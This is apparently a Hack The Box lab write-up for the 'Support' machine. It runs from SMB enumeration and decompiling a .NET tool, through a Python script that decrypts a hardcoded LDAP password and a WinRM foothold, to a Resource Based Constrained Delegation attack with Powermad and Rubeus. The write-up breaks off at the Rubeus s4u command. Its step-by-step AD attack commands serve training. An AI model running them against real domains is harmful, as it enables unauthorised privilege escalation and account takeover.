# Support 10.10.11.174

### Reconnaissance

- port 53/tcp Simple DNS Plus                                                       
- port 88/tcp Microsoft Windows Kerberos (server time: 2024-01-05 13:50:49Z)        
- port 135/tcp Microsoft Windows RPC                                                 
- port 139/tcp Microsoft Windows netbios-ssn                                         
- port 445/tcp SMB
- port 464/tcp kpasswd5?
- port 593/tcp Microsoft Windows RPC over HTTP 1.0                                   
- port 3268/tcp LDAP (Domain: support.htb)
- port 3269/tcp LDAPS
- port 5985/tcp WinRM
- port 9389/tcp mc-nmf .NET Message Framing   
- port 49664/tcp msrpc
- port 49668/tcp msrpc
- port 49676/tcp ncacn_http Microsoft Windows RPC over HTTP 1.0
- port 49679/tcp msrpc

The namp scan of the LDAP port shows us the domain name of the target: support.htb

**SMB**

We can list SMB shares on the target with `smbclient -L \\\\support.htb`

![Shares](./pictures/smb-shares.png)

We can connect to the share and list the contents with `smbclient \\\\support.htb\\support-tools`

![Tools](./pictures/tools.png)

As the comment suggests, it contains various support tools. Most of them are well known except for
UserInfo.exe, and googling it doesn't give any useful information 

After downloading the zip and extracting the contents of UserInfo.exe.zip, we can use the `file` command and
see that it's a .Net PE that we can decompile with [ILSpy](https://github.com/icsharpcode/ILSpy)

![UserInfo.exe](./pictures/userinfo.png)

In ILSpy we find a couple of interesting Classes in the UserInfo.Services namespace: LdapQuery and Protected

![UserInfo.Services](./pictures/userinfo.services.png)

LdapQuery has a method called LdapQuery that is used to connect with the LDAP server on the target and the 
query method below is used to query the server using the connection established by LdapQuery

This gives us the username `ldap` (`support\\ldap` -> `domain\\username`)

![LdapQuery](./pictures/ldapquery.png)

The Protected Class contains a method getPassword that decrypts the cipher text stored in enc_password using
2 keys

![getPassword](./pictures/getpassword.png)

We can extract this code and create a .Net console application or use python to decrypt the password

```
#!/usr/bin/env python3
import base64

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
# XOR key
key = b"armando"
# byte 0xDFu -> 223 (u is C# suffix for uint byte value)
key2 = 223

password = ''

for i in range(0, len(enc_password)):
    password += chr(enc_password[i] ^ key[i % len(key)] ^ key2)

print(password)
```

Now that we have the username and password we can use `ldapsearch` or `ldapdomaindump` to query the server 
and enumerate the users and groups on the target

`ldapsearch -H ldap://support.htb:3268 -D ldap@support.htb -w 'password' -b "cn=Users,dc=support,dc=htb"`
`ldapdomaindump -u support\\ldap -p 'password' ldap://support.htb:3268 -o ldap -at SIMPLE`

### Exploitation

*The box appears to be broken currently as we should see a custom tag in the support user object but 
regardless of the tool used it's not visible*

Enumerating the users we find a custom tag on the support user which appears to be a password, and that they 
are a member of the Remote Management Users Group which allows us to use WinRM as the support user

![Remote Management Users](./pictures/remote-management-users.png)

Using `evil-winrm` we get a shell on the target

![evil-winrm](./pictures/evilwinrm.png)

### Privilege Escalation

Now that we have user credentials for the target we can enumerate the target

Based on the services we found during our scanning the target is an AD machine, so we can enumerate it with 
Bloodhound

Upload the SharpHound.exe or .ps1 version corresponding to our Bloodhound version and run it on the target

We then download the .zip output from SharpHound, start `neo4j` (`sudo neo4j start`), run `bloodhound`, and 
import the .zip into bloodhound

Looking at our current user `support@support.htb`, we see that they have Group Delegated Object Control 
(a group the user is a member of has control over an object) over the Domain Controller

The Shared Support Accounts Group has GenericAll permissions over the Domain Controller, aka full control

![Bloodhound](./pictures/bloodhound.png)
![Full Control](./pictures/full-control.png)
![RBCD](./pictures/rbcd-attack.png)

This means we can perform a Resource Based Constrained Delegation Attack to gain Admin privileges if three 
conditions are met

1. We need code execution as a Domain user in the `Authenticated Users` Group  
2. The `ms-ds-machineaccountquota` attribute to be > 0  
3. The Domain user that we have code execution with needs write privileges over a domain joined machine

We can check our current user is part of the Authenticated Users group with `whoami /groups` or Bloodhound

![Authenticated Users whoami](./pictures/authenticated-users.png)
![Authenticated Users Bloodhound](./pictures/authenticated-users-bloodhound.png)

Next is the `ms-ds-machineaccountquota` attribute, which we can query with `Get-ADObject`

We need to know the DistinguishedName of the Domain for `Get-ADObject`'s `-Identity` parameter, we can find 
that with `Get-ADDomain`

`Get-ADObject -Identity "DC=support,DC=htb" -Properties ms-ds-machineaccountquota`

![ms-ds-machineaccountquota](./pictures/msdsmachineaccountquota.png)

We already determined we satisfy number 3 in our inital enumeration so we can start performing the attack

First we need to add a new machine account to the target with [Powermad](https://github.com/Kevin-Robertson/Powermad/tree/master) and get the SID of the created machine account

`New-MachineAccount -MachineAccount owned -Password $(ConvertTo-SecureString Password -AsPlainText -Force)`

`Get-ADComputer -identity owned`

![owned$ SID](./pictures/machine-account.png)

Next we need to set `PrincipalsAllowedToDelagateToAccount` to our machine account on the DC, this will 
configure the `msds-allowedtoactonbehalfofotheridentity` attribute for us (We could also use PowerView to 
set the attribute directly)

`Set-ADComputer -Identity DC -PrinicpalsAllowedToDelegateToAccount owned$`

![Sanity Check](./pictures/owned-check.png)

We can also check the value of `msds-allowedtoactonbehalfofidentity`

`Get-ADComputer DC -properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`

![check](./pictures/owned-allowed.png)

Now we need to use the s4u Rubeus module to generate a Kerberos ticket on behalf of the Administrator account

First we need the hash of the machine account's password

`Rubeus.exe hash /password:Password /user:owned$ /domain:support.htb`

![password hash](./pictures/rubeus-hash.png)

Now we can use s4u to create a Kerberos ticket for the Administrator account

`Rubeus.exe s4u /user:owned$ /rc4:A4F49C406510BDCAB6824EE7C30FD852 /impersonateuser:Administrator /msdsspn`



### Lessons Learned

- Check file type of any uncommon PE's to see if we can decompile them  
- DNSpy and ILSpy for decompiling .Net  
- Specify auth type for ldapdomaindump with `-at SIMPLE/NTLM`  
- Custom object tags aren't always visible with ldapsearch and ldapdomaindump
- Resource Based Constrained Delegation (RBCD) attacks require:  
    - code execution as a domain user that belongs to the Authenticated Users Group  
    - `ms-ds-machineaccountquota` attribute to be > 0 (Use `Get-ADObject`)  
    - current user needs `WRITE` privileges (`GenericAll/WriteDACL`) over a domain joined machine  
- When using Rubeus s4u, try cifs as the service for /msdsspn if PowerView's `Get-DomainUser username samaccountname,msds-allowedtodelegateto` returns nothing

